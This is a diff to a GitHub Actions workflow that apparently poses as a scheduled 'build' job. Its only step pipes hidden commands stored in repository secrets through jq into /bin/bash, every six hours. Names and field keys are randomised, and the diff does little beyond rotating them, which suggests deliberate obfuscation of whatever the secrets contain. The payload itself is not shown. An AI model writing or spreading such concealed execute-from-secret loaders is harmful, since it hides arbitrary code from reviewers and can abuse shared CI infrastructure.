@@ -1,21 +1,25 @@
 name: wangbodang6788
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 4/6 * * *'
+    - cron: '43 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wangbodang6788
         env:
-          ggdu6: ${{ secrets.ggdu6 }}
+          n767: ${{ secrets.n767 }}
         run: |
-          echo $ggdu6 | jq -r .ghnev83 | /bin/bash
-          echo $siu940 | jq -r .er5663 | /bin/bash
-          echo $mj91 | jq -r .qw79 | /bin/bash
-          echo $jly3908 | jq -r .hebr08 | /bin/bash
-          echo $w8016 | jq -r .g94 | /bin/bash
+          echo $n767 | jq -r .irpx38846 | /bin/bash
+          echo $wtuyn55937 | jq -r .ezut68 | /bin/bash
+          echo $cvzy43 | jq -r .hk455 | /bin/bash
+          echo $nm2 | jq -r .xs6 | /bin/bash
+          echo $bevb9 | jq -r .eyf1372 | /bin/bash
+          echo $dnepn0580 | jq -r .scx34 | /bin/bash
+          echo $cd3 | jq -r .teq416 | /bin/bash
+          echo $ngw72927 | jq -r .sje234 | /bin/bash
 
